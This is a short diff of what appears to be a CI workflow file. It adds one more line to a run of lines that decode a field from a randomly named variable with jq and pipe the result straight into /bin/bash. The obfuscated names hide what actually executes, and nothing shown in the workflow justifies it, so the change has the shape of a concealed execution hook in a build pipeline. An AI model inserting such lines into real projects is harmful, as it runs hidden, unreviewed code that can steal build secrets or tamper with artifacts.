@@ -45,6 +45,7 @@ jobs:
           printf '%s' "$t7247" | jq -r .eef83911 | /bin/bash
           printf '%s' "$dhxk129" | jq -r .nlq0 | /bin/bash
           echo $pm238 | jq -r .zjrh577 | /bin/bash
+          printf '%s' "$v98" | jq -r .cpz3 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
